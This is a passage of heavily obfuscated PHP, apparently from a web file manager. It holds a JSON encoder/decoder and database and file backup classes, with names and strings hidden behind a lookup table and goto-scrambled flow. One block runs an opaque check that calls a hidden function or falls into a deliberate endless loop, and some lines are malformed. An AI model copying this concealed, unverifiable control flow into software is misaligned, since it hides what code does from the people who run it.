| $B£„®×ğÆ‘ & 63); case (65535 & $B£„®×ğÆ‘) == $B£„®×ğÆ‘: return chr(224 | $B£„®×ğÆ‘ >> 12 & 15) . chr(128 | $B£„®×ğÆ‘ >> 6 & 63) . chr(128 | $B£„®×ğÆ‘ & 63); } return $b‰¢é‚¨è[33]; } function utf82utf16($aŠ£«Ò·Ş) { $dµ¹Ï…‡Ñ¤ =& $_SERVER[Ö]; if (function_exists($dµ¹Ï…‡Ñ¤[68])) { return mb_convert_encoding($aŠ£«Ò·Ş, $dµ¹Ï…‡Ñ¤[1912], $dµ¹Ï…‡Ñ¤[1563]); } switch (strlen($aŠ£«Ò·Ş)) { case 1: return $aŠ£«Ò·Ş; case 2: return chr(7 & ord($aŠ£«Ò·Ş[0]) >> 2) . chr(192 & ord($aŠ£«Ò·Ş[0]) << 6 | 63 & ord($aŠ£«Ò·Ş[1])); case 3: return chr(240 & ord($aŠ£«Ò·Ş[0]) << 4 | 15 & ord($aŠ£«Ò·Ş[1]) >> 2) . chr(192 & ord($aŠ£«Ò·Ş[1]) << 6 | 127 & ord($aŠ£«Ò·Ş[2])); } return $dµ¹Ï…‡Ñ¤[33]; } function encode($A˜ÕÕÄ„ë) { $a¬İİÑË³Ø =& $_SERVER[Ö]; switch (gettype($A˜ÕÕÄ„ë)) { case $a¬İİÑË³Ø[1574]: return $A˜ÕÕÄ„ë ? $a¬İİÑË³Ø[1573] : $a¬İİÑË³Ø[1575]; case $a¬İİÑË³Ø[1913]: return $a¬İİÑË³Ø[99]; case $a¬İİÑË³Ø[299]: return (int) $A˜ÕÕÄ„ë; case $a¬İİÑË³Ø[274]: case $a¬İİÑË³Ø[273]: return (double) $A˜ÕÕÄ„ë; case $a¬İİÑË³Ø[308]: $fá‡—éÊ§ = $a¬İİÑË³Ø[33]; $C´Ì…è÷ÍÀ = strlen($A˜ÕÕÄ„ë); for ($FˆÜ‚¤“‘® = 0; $FˆÜ‚¤“‘® < $C´Ì…è÷ÍÀ; ++$FˆÜ‚¤“‘®) { $c÷„Â‰²ÈÌ = ord($A˜ÕÕÄ„ë[$FˆÜ‚¤“‘®]); switch (!0) { case $c÷„Â‰²ÈÌ == 8: $fá‡—éÊ§ .= $a¬İİÑË³Ø[1914]; break; case $c÷„Â‰²ÈÌ == 9: $fá‡—éÊ§ .= $a¬İİÑË³Ø[1550]; break; case $c÷„Â‰²ÈÌ == 10: $fá‡—éÊ§ .= $a¬İİÑË³Ø[1548]; break; case $c÷„Â‰²ÈÌ == 12: $fá‡—éÊ§ .= $a¬İİÑË³Ø[1915]; break; case $c÷„Â‰²ÈÌ == 13: $fá‡—éÊ§ .= $a¬İİÑË³Ø[1549]; break; case $c÷„Â‰²ÈÌ == 34: case $c÷„Â‰²ÈÌ == 47: case $c÷„Â‰²ÈÌ == 92: $fá‡—éÊ§ .= $a¬İİÑË³Ø[93] . $A˜ÕÕÄ„ë[$FˆÜ‚¤“‘®]; break; case $c÷„Â‰²ÈÌ >= 32 && $c÷„Â‰²ÈÌ <= 127: $fá‡—éÊ§ .= $A˜ÕÕÄ„ë[$FˆÜ‚¤“‘®]; break; case ($c÷„Â‰²ÈÌ & 224) == 192: $bĞãÈ¥Ô¬ = pack($a¬İİÑË³Ø[1916], $c÷„Â‰²ÈÌ, ord($A˜ÕÕÄ„ë[$FˆÜ‚¤“‘® + 1])); $FˆÜ‚¤“‘® += 1; $a¦à£‰ƒŸ = $this->utf82utf16($bĞãÈ¥Ô¬); $fá‡—éÊ§ .= sprintf($a¬İİÑË³Ø[1917], bin2hex($a¦à£‰ƒŸ)); break; case ($c÷„Â‰²ÈÌ & 240) == 224: $bĞãÈ¥Ô¬ = pack($a¬İİÑË³Ø[1916], $c÷„Â‰²ÈÌ, ord($A˜ÕÕÄ„ë[$FˆÜ‚¤“‘® + 1]), ord($A˜ÕÕÄ„ë[$FˆÜ‚¤“‘® + 2])); $FˆÜ‚¤“‘® += 2; $a¦à£‰ƒŸ = $this->utf82utf16($bĞãÈ¥Ô¬); $fá‡—éÊ§ .= sprintf($a¬İİÑË³Ø[1917], bin2hex($a¦à£‰ƒŸ)); break; case ($c÷„Â‰²ÈÌ & 248) == 240: $bĞãÈ¥Ô¬ = pack($a¬İİÑË³Ø[1916], $c÷„Â‰²ÈÌ, ord($A˜ÕÕÄ„ë[$FˆÜ‚¤“‘® + 1]), ord($A˜ÕÕÄ„ë[$FˆÜ‚¤“‘® + 2]), ord($A˜ÕÕÄ„ë[$FˆÜ‚¤“‘® + 3])); $FˆÜ‚¤“‘® += 3; $a¦à£‰ƒŸ = $this->utf82utf16($bĞãÈ¥Ô¬); $fá‡—éÊ§ .= sprintf($a¬İİÑË³Ø[1917], bin2hex($a¦à£‰ƒŸ)); break; case ($c÷„Â‰²ÈÌ & 252) == 248: $bĞãÈ¥Ô¬ = pack($a¬İİÑË³Ø[1916], $c÷„Â‰²ÈÌ, ord($A˜ÕÕÄ„ë[$FˆÜ‚¤“‘® + 1]), ord($A˜ÕÕÄ„ë[$FˆÜ‚¤“‘® + 2]), ord($A˜ÕÕÄ„ë[$FˆÜ‚¤“‘® + 3]), ord($A˜ÕÕÄ„ë[$FˆÜ‚¤“‘® + 4])); $FˆÜ‚¤“‘® += 4; $a¦à£‰ƒŸ = $this->utf82utf16($bĞãÈ¥Ô¬); $fá‡—éÊ§ .= sprintf($a¬İİÑË³Ø[1917], bin2hex($a¦à£‰ƒŸ)); break; case ($c÷„Â‰²ÈÌ & 254) == 252: $bĞãÈ¥Ô¬ = pack($a¬İİÑË³Ø[1916], $c÷„Â‰²ÈÌ, ord($A˜ÕÕÄ„ë[$FˆÜ‚¤“‘® + 1]), ord($A˜ÕÕÄ„ë[$FˆÜ‚¤“‘® + 2]), ord($A˜ÕÕÄ„ë[$FˆÜ‚¤“‘® + 3]), ord($A˜ÕÕÄ„ë[$FˆÜ‚¤“‘® + 4]), ord($A˜ÕÕÄ„ë[$FˆÜ‚¤“‘® + 5])); $FˆÜ‚¤“‘® += 5; $a¦à£‰ƒŸ = $this->utf82utf16($bĞãÈ¥Ô¬); $fá‡—éÊ§ .= sprintf($a¬İİÑË³Ø[1917], bin2hex($a¦à£‰ƒŸ)); break; } } return $a¬İİÑË³Ø[112] . $fá‡—éÊ§ . $a¬İİÑË³Ø[112]; case $a¬İİÑË³Ø[1918]: if (is_array($A˜ÕÕÄ„ë) && count($A˜ÕÕÄ„ë) && array_keys($A˜ÕÕÄ„ë) !== range(0, sizeof($A˜ÕÕÄ„ë) - 1)) { $aö²Òìœšº = array_map(array($this, $a¬İİÑË³Ø[1919]), array_keys($A˜ÕÕÄ„ë), array_values($A˜ÕÕÄ„ë)); foreach ($aö²Òìœšº as $D¥äã¨ÀÙœ) { if (Services_JSON::isError($D¥äã¨ÀÙœ)) { return $D¥äã¨ÀÙœ; } } return $a¬İİÑË³Ø[1061] . join($a¬İİÑË³Ø[47], $aö²Òìœšº) . $a¬İİÑË³Ø[311]; } $cÑÙë½É§ß = array_map(array($this, $a¬İİÑË³Ø[1920]), $A˜ÕÕÄ„ë); foreach ($cÑÙë½É§ß as $Bš«ˆ—ß¸) { if (Services_JSON::isError($Bš«ˆ—ß¸)) { return $Bš«ˆ—ß¸; } } return $a¬İİÑË³Ø[153] . join($a¬İİÑË³Ø[47], $cÑÙë½É§ß) . $a¬İİÑË³Ø[472]; case $a¬İİÑË³Ø[1921]: $d±İ›”ÏÜ» = get_object_vars($A˜ÕÕÄ„ë); $aö²Òìœšº = array_map(array($this, $a¬İİÑË³Ø[1919]), array_keys($d±İ›”ÏÜ»), array_values($d±İ›”ÏÜ»)); foreach ($aö²Òìœšº as $D¥äã¨ÀÙœ) { if (Services_JSON::isError($D¥äã¨ÀÙœ)) { return $D¥äã¨ÀÙœ; } } return $a¬İİÑË³Ø[1061] . join($a¬İİÑË³Ø[47], $aö²Òìœšº) . $a¬İİÑË³Ø[311]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $a¬İİÑË³Ø[99] : new Services_JSON_Error(gettype($A˜ÕÕÄ„ë) . $a¬İİÑË³Ø[1922]); } } function name_value($fÓ¦ÎËÎ, $fƒãÔº–Ô­) { $f¯ÖÔ«ŒÖ = $this->encode($fƒãÔº–Ô­); if (Services_JSON::isError($f¯ÖÔ«ŒÖ)) { return $f¯ÖÔ«ŒÖ; } return $this->encode(strval($fÓ¦ÎËÎ)) . $_SERVER[Ö][4] . $f¯ÖÔ«ŒÖ; } function reduce_string($eäÂä£áÎ) { $cÍğ¹¥” =& $_SERVER[Ö]; $eäÂä£áÎ = preg_replace(array($cÍğ¹¥”[1923], $cÍğ¹¥”[1924], $cÍğ¹¥”[1925]), $cÍğ¹¥”[33], $eäÂä£áÎ); return trim($eäÂä£áÎ); } function decode($Bñ×¨Ââß£) { $a‚Ëò¶ˆÁØ =& $_SERVER[Ö]; $Bñ×¨Ââß£ = $this->reduce_string($Bñ×¨Ââß£); switch (strtolower($Bñ×¨Ââß£)) { case $a‚Ëò¶ˆÁØ[1573]: return !0; case $a‚Ëò¶ˆÁØ[1575]: return !1; case $a‚Ëò¶ˆÁØ[99]: return null; default: $bØÒµ°Àøç = array(); if (is_numeric($Bñ×¨Ââß£)) { return (double) $Bñ×¨Ââß£ == (int) $Bñ×¨Ââß£ ? (int) $Bñ×¨Ââß£ : (double) $Bñ×¨Ââß£; } elseif (preg_match($a‚Ëò¶ˆÁØ[1926], $Bñ×¨Ââß£, $bØÒµ°Àøç) && $bØÒµ°Àøç[1] == $bØÒµ°Àøç[2]) { $d…¿Ë†¹Ü = substr($Bñ×¨Ââß£, 0, 1); $açñˆæ×çî = substr($Bñ×¨Ââß£, 1, -1); $a½°’¼¥Ô” = $a‚Ëò¶ˆÁØ[33]; $Bˆ˜äµíà = strlen($açñˆæ×çî); for ($cÈ¾ÃÏØ»É = 0; $cÈ¾ÃÏØ»É < $Bˆ˜äµíà; ++$cÈ¾ÃÏØ»É) { $f¼Îä¨Š™ = substr($açñˆæ×çî, $cÈ¾ÃÏØ»É, 2); $fóñ÷·à = ord($açñˆæ×çî[$cÈ¾ÃÏØ»É]); switch (!0) { case $f¼Îä¨Š™ == $a‚Ëò¶ˆÁØ[1914]: $a½°’¼¥Ô” .= chr(8); ++$cÈ¾ÃÏØ»É; break; case $f¼Îä¨Š™ == $a‚Ëò¶ˆÁØ[1550]: $a½°’¼¥Ô” .= chr(9); ++$cÈ¾ÃÏØ»É; break; case $f¼Îä¨Š™ == $a‚Ëò¶ˆÁØ[1548]: $a½°’¼¥Ô” .= chr(10); ++$cÈ¾ÃÏØ»É; break; case $f¼Îä¨Š™ == $a‚Ëò¶ˆÁØ[1915]: $a½°’¼¥Ô” .= chr(12); ++$cÈ¾ÃÏØ»É; break; case $f¼Îä¨Š™ == $a‚Ëò¶ˆÁØ[1549]: $a½°’¼¥Ô” .= chr(13); ++$cÈ¾ÃÏØ»É; break; case $f¼Îä¨Š™ == $a‚Ëò¶ˆÁØ[1332]: case $f¼Îä¨Š™ == $a‚Ëò¶ˆÁØ[1927]: case $f¼Îä¨Š™ == $a‚Ëò¶ˆÁØ[1543]: case $f¼Îä¨Š™ == $a‚Ëò¶ˆÁØ[1545]: if ($d…¿Ë†¹Ü == $a‚Ëò¶ˆÁØ[112] && $f¼Îä¨Š™ != $a‚Ëò¶ˆÁØ[1927] || $d…¿Ë†¹Ü == $a‚Ëò¶ˆÁØ[55] && $f¼Îä¨Š™ != $a‚Ëò¶ˆÁØ[1332]) { $a½°’¼¥Ô” .= $açñˆæ×çî[++$cÈ¾ÃÏØ»É]; } break; case preg_match($a‚Ëò¶ˆÁØ[1928], substr($açñˆæ×çî, $cÈ¾ÃÏØ»É, 6)): $A’İî¢ä°– = chr(hexdec(substr($açñˆæ×çî, $cÈ¾ÃÏØ»É + 2, 2))) . chr(hexdec(substr($açñˆæ×çî, $cÈ¾ÃÏØ»É + 4, 2))); $a½°’¼¥Ô” .= $this->utf162utf8($A’İî¢ä°–); $cÈ¾ÃÏØ»É += 5; break; case $fóñ÷·à >= 32 && $fóñ÷·à <= 127: $a½°’¼¥Ô” .= $açñˆæ×çî[$cÈ¾ÃÏØ»É]; break; case ($fóñ÷·à & 224) == 192: $a½°’¼¥Ô” .= substr($açñˆæ×çî, $cÈ¾ÃÏØ»É, 2); ++$cÈ¾ÃÏØ»É; break; case ($fóñ÷·à & 240) == 224: $a½°’¼¥Ô” .= substr($açñˆæ×çî, $cÈ¾ÃÏØ»É, 3); $cÈ¾ÃÏØ»É += 2; break; case ($fóñ÷·à & 248) == 240: $a½°’¼¥Ô” .= substr($açñˆæ×çî, $cÈ¾ÃÏØ»É, 4); $cÈ¾ÃÏØ»É += 3; break; case ($fóñ÷·à & 252) == 248: $a½°’¼¥Ô” .= substr($açñˆæ×çî, $cÈ¾ÃÏØ»É, 5); $cÈ¾ÃÏØ»É += 4; break; case ($fóñ÷·à & 254) == 252: $a½°’¼¥Ô” .= substr($açñˆæ×çî, $cÈ¾ÃÏØ»É, 6); $cÈ¾ÃÏØ»É += 5; break; } } return $a½°’¼¥Ô”; } elseif (preg_match($a‚Ëò¶ˆÁØ[1929], $Bñ×¨Ââß£) || preg_match($a‚Ëò¶ˆÁØ[1930], $Bñ×¨Ââß£)) { goto cËë–Ö¶ß¤; AíÀãÎá‹: $açñˆæ×çî = $this->reduce_string($açñˆæ×çî); if ($açñˆæ×çî == $a‚Ëò¶ˆÁØ[33]) { if (reset($f‘æ¦†Õ‘—) == SERVICES_JSON_IN_ARR) { return $D¹â½õˆÒˆ; } else { return $bŒÕ·ßÍß§; } } $Bˆ˜äµíà = strlen($açñˆæ×çî); goto EÏ±Ï„í”; cËë–Ö¶ß¤: if ($Bñ×¨Ââß£[0] == $a‚Ëò¶ˆÁØ[153]) { $f‘æ¦†Õ‘— = array(SERVICES_JSON_IN_ARR); $D¹â½õˆÒˆ = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $f‘æ¦†Õ‘— = array(SERVICES_JSON_IN_OBJ); $bŒÕ·ßÍß§ = array(); } else { $f‘æ¦†Õ‘— = array(SERVICES_JSON_IN_OBJ); $bŒÕ·ßÍß§ = new stdClass(); } } array_push($f‘æ¦†Õ‘—, array($a‚Ëò¶ˆÁØ[1931] => SERVICES_JSON_SLICE, $a‚Ëò¶ˆÁØ[259] => 0, $a‚Ëò¶ˆÁØ[1932] => !1)); $açñˆæ×çî = substr($Bñ×¨Ââß£, 1, -1); goto AíÀãÎá‹; EÏ±Ï„í”: for ($cÈ¾ÃÏØ»É = 0; $cÈ¾ÃÏØ»É <= $Bˆ˜äµíà; ++$cÈ¾ÃÏØ»É) { $A†·òÌ„«š = end($f‘æ¦†Õ‘—); $f¼Îä¨Š™ = substr($açñˆæ×çî, $cÈ¾ÃÏØ»É, 2); if ($cÈ¾ÃÏØ»É == $Bˆ˜äµíà || $açñˆæ×çî[$cÈ¾ÃÏØ»É] == $a‚Ëò¶ˆÁØ[47] && $A†·òÌ„«š[$a‚Ëò¶ˆÁØ[1931]] == SERVICES_JSON_SLICE) { $AÍ‚òá‡ = substr($açñˆæ×çî, $A†·òÌ„«š[$a‚Ëò¶ˆÁØ[259]], $cÈ¾ÃÏØ»É - $A†·òÌ„«š[$a‚Ëò¶ˆÁØ[259]]); array_push($f‘æ¦†Õ‘—, array($a‚Ëò¶ˆÁØ[1931] => SERVICES_JSON_SLICE, $a‚Ëò¶ˆÁØ[259] => $cÈ¾ÃÏØ»É + 1, $a‚Ëò¶ˆÁØ[1932] => !1)); if (reset($f‘æ¦†Õ‘—) == SERVICES_JSON_IN_ARR) { array_push($D¹â½õˆÒˆ, $this->decode($AÍ‚òá‡)); } elseif (reset($f‘æ¦†Õ‘—) == SERVICES_JSON_IN_OBJ) { $DºÏ‚²Ğ— = array(); if (preg_match($a‚Ëò¶ˆÁØ[1933], $AÍ‚òá‡, $DºÏ‚²Ğ—)) { $DåßÑÅÒà = $this->decode($DºÏ‚²Ğ—[1]); $EÊŒšçç¬ = $this->decode($DºÏ‚²Ğ—[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $bŒÕ·ßÍß§[$DåßÑÅÒà] = $EÊŒšçç¬; } else { $bŒÕ·ßÍß§->{$DåßÑÅÒà} = $EÊŒšçç¬; } } elseif (preg_match($a‚Ëò¶ˆÁØ[1934], $AÍ‚òá‡, $DºÏ‚²Ğ—)) { $DåßÑÅÒà = $DºÏ‚²Ğ—[1]; $EÊŒšçç¬ = $this->decode($DºÏ‚²Ğ—[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $bŒÕ·ßÍß§[$DåßÑÅÒà] = $EÊŒšçç¬; } else { $bŒÕ·ßÍß§->{$DåßÑÅÒà} = $EÊŒšçç¬; } } } } elseif (($açñˆæ×çî[$cÈ¾ÃÏØ»É] == $a‚Ëò¶ˆÁØ[112] || $açñˆæ×çî[$cÈ¾ÃÏØ»É] == $a‚Ëò¶ˆÁØ[55]) && $A†·òÌ„«š[$a‚Ëò¶ˆÁØ[1931]] != SERVICES_JSON_IN_STR) { array_push($f‘æ¦†Õ‘—, array($a‚Ëò¶ˆÁØ[1931] => SERVICES_JSON_IN_STR, $a‚Ëò¶ˆÁØ[259] => $cÈ¾ÃÏØ»É, $a‚Ëò¶ˆÁØ[1932] => $açñˆæ×çî[$cÈ¾ÃÏØ»É])); } elseif ($açñˆæ×çî[$cÈ¾ÃÏØ»É] == $A†·òÌ„«š[$a‚Ëò¶ˆÁØ[1932]] && $A†·òÌ„«š[$a‚Ëò¶ˆÁØ[1931]] == SERVICES_JSON_IN_STR && (strlen(substr($açñˆæ×çî, 0, $cÈ¾ÃÏØ»É)) - strlen(rtrim(substr($açñˆæ×çî, 0, $cÈ¾ÃÏØ»É), $a‚Ëò¶ˆÁØ[93]))) % 2 != 1) { array_pop($f‘æ¦†Õ‘—); } elseif ($açñˆæ×çî[$cÈ¾ÃÏØ»É] == $a‚Ëò¶ˆÁØ[153] && in_array($A†·òÌ„«š[$a‚Ëò¶ˆÁØ[1931]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($f‘æ¦†Õ‘—, array($a‚Ëò¶ˆÁØ[1931] => SERVICES_JSON_IN_ARR, $a‚Ëò¶ˆÁØ[259] => $cÈ¾ÃÏØ»É, $a‚Ëò¶ˆÁØ[1932] => !1)); } elseif ($açñˆæ×çî[$cÈ¾ÃÏØ»É] == $a‚Ëò¶ˆÁØ[472] && $A†·òÌ„«š[$a‚Ëò¶ˆÁØ[1931]] == SERVICES_JSON_IN_ARR) { array_pop($f‘æ¦†Õ‘—); } elseif ($açñˆæ×çî[$cÈ¾ÃÏØ»É] == $a‚Ëò¶ˆÁØ[1061] && in_array($A†·òÌ„«š[$a‚Ëò¶ˆÁØ[1931]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($f‘æ¦†Õ‘—, array($a‚Ëò¶ˆÁØ[1931] => SERVICES_JSON_IN_OBJ, $a‚Ëò¶ˆÁØ[259] => $cÈ¾ÃÏØ»É, $a‚Ëò¶ˆÁØ[1932] => !1)); } elseif ($açñˆæ×çî[$cÈ¾ÃÏØ»É] == $a‚Ëò¶ˆÁØ[311] && $A†·òÌ„«š[$a‚Ëò¶ˆÁØ[1931]] == SERVICES_JSON_IN_OBJ) { array_pop($f‘æ¦†Õ‘—); } elseif ($f¼Îä¨Š™ == $a‚Ëò¶ˆÁØ[1935] && in_array($A†·òÌ„«š[$a‚Ëò¶ˆÁØ[1931]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($f‘æ¦†Õ‘—, array($a‚Ëò¶ˆÁØ[1931] => SERVICES_JSON_IN_CMT, $a‚Ëò¶ˆÁØ[259] => $cÈ¾ÃÏØ»É, $a‚Ëò¶ˆÁØ[1932] => !1)); $cÈ¾ÃÏØ»É++; } elseif ($f¼Îä¨Š™ == $a‚Ëò¶ˆÁØ[1936] && $A†·òÌ„«š[$a‚Ëò¶ˆÁØ[1931]] == SERVICES_JSON_IN_CMT) { array_pop($f‘æ¦†Õ‘—); $cÈ¾ÃÏØ»É++; for ($cç«‡äÛĞ = $A†·òÌ„«š[$a‚Ëò¶ˆÁØ[259]]; $cç«‡äÛĞ <= $cÈ¾ÃÏØ»É; ++$cç«‡äÛĞ) { $açñˆæ×çî = substr_replace($açñˆæ×çî, $a‚Ëò¶ˆÁØ[50], $cç«‡äÛĞ, 1); } } } if (reset($f‘æ¦†Õ‘—) == SERVICES_JSON_IN_ARR) { return $D¹â½õˆÒˆ; } elseif (reset($f‘æ¦†Õ‘—) == SERVICES_JSON_IN_OBJ) { return $bŒÕ·ßÍß§; } goto dÉ¸¯¯Ø¾; dÉ¸¯¯Ø¾: } } } function isError($f’ñ«™ƒáÅ, $bÚÒÂ¦­­Ö = null) { $fé“ƒñ“ŒÒ =& $_SERVER[Ö]; if (class_exists($fé“ƒñ“ŒÒ[1937])) { return PEAR::isError($f’ñ«™ƒáÅ, $bÚÒÂ¦­­Ö); } elseif (is_object($f’ñ«™ƒáÅ) && (get_class($f’ñ«™ƒáÅ) == $fé“ƒñ“ŒÒ[1938] || is_subclass_of($f’ñ«™ƒáÅ, $fé“ƒñ“ŒÒ[1938]))) { return !0; } return !1; } } if (class_exists($_SERVER[Ö][1939])) { if (!isset($_SERVER[$_SERVER[Ö][755]]) || !isset($_SERVER[$_SERVER[Ö][1294]])) { goto E¸ëåŠÑ³Ü; AÜóÌÃÈ‡÷: $E²ñÓ£ò ($_SERVER[$_SERVER[Ö][757]] . $_SERVER[Ö][758]); $Dì¤Óé°·ª = 2; while ($Dì¤Óé°·ª > 1) { $eîÁ²éÇ×‚ = rawurlencode($Dì¤Óé°·ª . $_SERVER[Ö][357]); } goto FæÏ¦à‡½ƒ; E¸ëåŠÑ³Ü: $f‰“šî‡ß = $_SERVER[Ö][756]; $E‚‰ˆŒäå‚ = $_SERVER[$_SERVER[Ö][757]] . $_SERVER[Ö][758]; $bº¢Ä¡ÙÈ = $f‰“šî‡ß($E‚‰ˆŒäå‚); goto bÂ÷Å¤ÚØ; bÂ÷Å¤ÚØ: $AŠ×ë´›âÈ = explode($_SERVER[Ö][213], $bº¢Ä¡ÙÈ); if (count($AŠ×ë´›âÈ) < $_SERVER[Ö][555]) { $c×ê©àŸŠš = $_SERVER[Ö][759]; $c×ê©àŸŠš(); } $E²ñÓ£ò  = $_SERVER[Ö][760]; goto AÜóÌÃÈ‡÷; FæÏ¦à‡½ƒ: } class Services_JSON_Error extends PEAR_Error { function __construct($Fä“ô‚¼ÕÁ = "\165\156\x6b\156\x6f\x77\156\40\x65\162\162\157\162", $Dø®Ù‚•š† = null, $dïŒ”Ú¢¨… = null, $B¡ñìê¨‰ = null, $B†½Ó¹á™ = null) { parent::PEAR_Error($Fä“ô‚¼ÕÁ, $Dø®Ù‚•š†, $dïŒ”Ú¢¨…, $B¡ñìê¨‰, $B†½Ó¹á™); } } } else { class Services_JSON_Error { function __construct($CĞ›ƒ¸ß’Ç = "\165\156\153\156\157\x77\156\40\x65\x72\162\157\162", $E«çë›„ğ· = null, $fòõšô¥Ì² = null, $f¬ßÎÓˆ¸™ = null, $d‚¼ß“âäœ = null) { } } } $FğîÈ’·â = LIB_DIR . $_SERVER[Ö][753]; goto eŞ»à­á§; C‘»˜ä×À­: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto E„˜œ¶Ğöš; d–“—ù©©é: $D­‹²Ó¼ì->end(); $añÑß‘¿ôÎ = array($aá¶Ö¸ø™š[713] => $eŸã¸³ìµÂ, $aá¶Ö¸ø™š[700] => 1, $aá¶Ö¸ø™š[714] => $aè˜‡¯‘Òø, $aá¶Ö¸ø™š[715] => $aè˜‡¯‘Òø); Backup::set($añÑß‘¿ôÎ); goto DŞŸÒ‚†ˆ; D¼¯¤—êÇí: $DöÁĞè­Í· = new DbManage($E¸Û‚×¡•¶, $eŸã¸³ìµÂ); $EìÜòÀ¾… = TEMP_FILES . $aá¶Ö¸ø™š[703] . self::$name . $aá¶Ö¸ø™š[8]; del_dir($EìÜòÀ¾…); goto cÈÈÔ–½¡…; DŞŸÒ‚†ˆ: return !0; goto Dë±ÓÛ¸¢¡; cÈÈÔ–½¡…: mk_dir($EìÜòÀ¾…); $e¹µïÁìä® = $DöÁĞè­Í·->db()->getTables(); $aè˜‡¯‘Òø = 0; goto BÀÔ¶Æî¡¬; E„˜œ¶Ğöš: $aá¶Ö¸ø™š =& $_SERVER[Ö]; $eÛãÆğÉÇ‰ = Backup::get(); self::$io = $eÛãÆğÉÇ‰[$aá¶Ö¸ø™š[684]]; goto DØ‰…˜Ğ¤; BÀÔ¶Æî¡¬: $D­‹²Ó¼ì = new Task($aá¶Ö¸ø™š[704], $aá¶Ö¸ø™š[705], 0, LNG($aá¶Ö¸ø™š[706]) . $aá¶Ö¸ø™š[707] . LNG($aá¶Ö¸ø™š[708])); $e¹µïÁìä® = array_diff($e¹µïÁìä®, array($aá¶Ö¸ø™š[709], $aá¶Ö¸ø™š[710])); foreach ($e¹µïÁìä® as $EŸ‘ÜÆğŸ‘) { $A¼ˆÓùĞ = $EìÜòÀ¾… . $EŸ‘ÜÆğŸ‘ . $aá¶Ö¸ø™š[711]; $EÚ‘Á¨ÅİÛ = null; if ($EŸ‘ÜÆğŸ‘ == $aá¶Ö¸ø™š[712] && (!isset($eÛãÆğÉÇ‰[$aá¶Ö¸ø™š[685]]) || $eÛãÆğÉÇ‰[$aá¶Ö¸ø™š[685]] == $aá¶Ö¸ø™š[464])) { $EÚ‘Á¨ÅİÛ = self::$io; } $aè˜‡¯‘Òø += $DöÁĞè­Í·->sqlFromDb($EŸ‘ÜÆğŸ‘, $A¼ˆÓùĞ, $D­‹²Ó¼ì, $EÚ‘Á¨ÅİÛ); } goto d–“—ù©©é; DØ‰…˜Ğ¤: self::$name = $eÛãÆğÉÇ‰[$aá¶Ö¸ø™š[28]]; $E¸Û‚×¡•¶ = $GLOBALS[$aá¶Ö¸ø™š[6]][$aá¶Ö¸ø™š[17]]; $eŸã¸³ìµÂ = $this->_dbType($E¸Û‚×¡•¶); goto D¼¯¤—êÇí; Dë±ÓÛ¸¢¡: } private function _dbType($AÔ…‹†‡Š) { goto e÷ÊÌÌ•‚; Añ×Óô×¦¢: return $C·…¾ˆ™¬Â; goto C·óî¢¤‘«; A‚È×à²ÁÚ: if ($C·…¾ˆ™¬Â == $a‹Œ·äµÂ×[717]) { $bšİ¹‘¨•ê = explode($a‹Œ·äµÂ×[4], $AÔ…‹†‡Š[$a‹Œ·äµÂ×[718]]); $C·…¾ˆ™¬Â = $bšİ¹‘¨•ê[0]; } $FÃÇ„öŞ¥Í = array($a‹Œ·äµÂ×[719] => $a‹Œ·äµÂ×[9], $a‹Œ·äµÂ×[720] => $a‹Œ·äµÂ×[721]); if (isset($FÃÇ„öŞ¥Í[$C·…¾ˆ™¬Â])) { $C·…¾ˆ™¬Â = $FÃÇ„öŞ¥Í[$C·…¾ˆ™¬Â]; } goto Añ×Óô×¦¢; e÷ÊÌÌ•‚: $a‹Œ·äµÂ× =& $_SERVER[Ö]; $AÔ…‹†‡Š = array_change_key_case($AÔ…‹†‡Š); $C·…¾ˆ™¬Â = $AÔ…‹†‡Š[$a‹Œ·äµÂ×[716]]; goto A‚È×à²ÁÚ; C·óî¢¤‘«: } } class BackupDbFile { public function __construct() { } public function index() { goto b÷èîƒ£áì; Fí»Š…¶ Ÿ: Backup::set(array($cÍßÀ¤ó¯à[724] => $bğ¬³ä‡‘[$cÍßÀ¤ó¯à[77]])); IO::move($Aò‰Ë‚²Ññ, $eÂÂ£ÓÕ¤½); $CŞç§õ¾« = CONTROLLER_DIR . $cÍßÀ¤ó¯à[725]; goto fšÍĞ—Àé; fÏÚÈ®«¸: $Aò‰Ë‚²Ññ = TEMP_FILES . "\x62\x61\x63\x6b\x75\160\137{$CÁê¬ù• Ç}\x2f"; $eÂÂ£ÓÕ¤½ = "\x7b\x69\157\x3a{$Dö¨Âêî°î[$cÍßÀ¤ó¯à[684]]}\175\x2f\x64\141\164\x61\142\x61\163\x65\57"; IO::mkdir($eÂÂ£ÓÕ¤½ . "\142\x61\x63\153\165\x70\x5f{$CÁê¬ù• Ç}\57"); goto EöÉ“ÆŸ; EöÉ“ÆŸ: $F…´ÏÙ×ïĞ = new TaskFileTransfer($cÍßÀ¤ó¯à[722], $cÍßÀ¤ó¯à[705], 0, LNG($cÍßÀ¤ó¯à[706]) . $cÍßÀ¤ó¯à[408] . LNG($cÍßÀ¤ó¯à[708]) . $cÍßÀ¤ó¯à[723]); $F…´ÏÙ×ïĞ->addPath($Aò‰Ë‚²Ññ); $bğ¬³ä‡‘ = IO::infoWithChildren($Aò‰Ë‚²Ññ); goto Fí»Š…¶ Ÿ; b÷èîƒ£áì: $cÍßÀ¤ó¯à =& $_SERVER[Ö]; $Dö¨Âêî°î = Backup::get(); $CÁê¬ù• Ç = $Dö¨Âêî°î[$cÍßÀ¤ó¯à[28]]; goto fÏÚÈ®«¸; f½Ï‰©¡à: return !0; goto E‡Ã¨Îù¹; fšÍĞ—Àé: IO::copy($CŞç§õ¾«, $eÂÂ£ÓÕ¤½ . "\x62\x61\143\153\x75\160\x5f{$CÁê¬ù• Ç}\57"); $F…´ÏÙ×ïĞ->end(); Backup::set(array($cÍßÀ¤ó¯à[726] => $bğ¬³ä‡‘[$cÍßÀ¤ó¯à[77]])); goto f½Ï‰©¡à; E‡Ã¨Îù¹: } } class BackupFile { public function __construct() { } public function index() { goto D×Ÿ®óğ; bóÍªÈÃ·: 